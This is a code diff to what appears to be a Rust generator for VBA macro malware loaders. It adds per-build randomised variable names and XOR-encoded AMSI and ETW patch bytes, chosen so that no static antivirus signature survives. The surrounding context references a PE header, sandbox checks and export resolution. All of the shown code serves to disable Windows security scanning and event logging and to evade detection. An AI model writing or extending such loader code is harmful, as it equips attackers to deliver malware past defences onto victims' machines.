@@ -237,6 +237,11 @@ fn build_context(config: &LoaderConfig) -> Context {
         "4d5a90000300000004000000ffff0000".to_string(),
     );
 
+    // Patch loop idents — randomize local VBA variable names
+    for k in &["var_amsi_patch", "var_amsi_xk", "var_amsi_pi",
+               "var_etw_patch",  "var_etw_xk",  "var_etw_pi"] {
+        vars.insert(k, rand_ident(8));
+    }
     // New function idents for ETW/sandbox/export-resolve
     for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport"] {
         vars.insert(k, rand_ident(10));
@@ -361,6 +366,19 @@ fn build_context(config: &LoaderConfig) -> Context {
         .map(|f| format!("{:?}", f))
         .collect();
     ctx.insert("feature_names", &feature_names);
+
+    // XOR-encode AMSI/ETW patch bytes per-generation so no static byte signature survives
+    let amsi_xor: u8 = rng.gen();
+    let etw_xor:  u8 = rng.gen();
+    let amsi_enc: Vec<String> = [0xB8u8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        .iter().map(|b| format!("{:02X}", b ^ amsi_xor)).collect();
+    let etw_enc: Vec<String> = [0x31u8, 0xC0, 0xC3, 0x90]
+        .iter().map(|b| format!("{:02X}", b ^ etw_xor)).collect();
+    ctx.insert("amsi_xor_key",   &format!("{:02X}", amsi_xor));
+    ctx.insert("etw_xor_key",    &format!("{:02X}", etw_xor));
+    ctx.insert("amsi_enc_bytes", &amsi_enc);
+    ctx.insert("etw_enc_bytes",  &etw_enc);
+
     ctx
 }
 
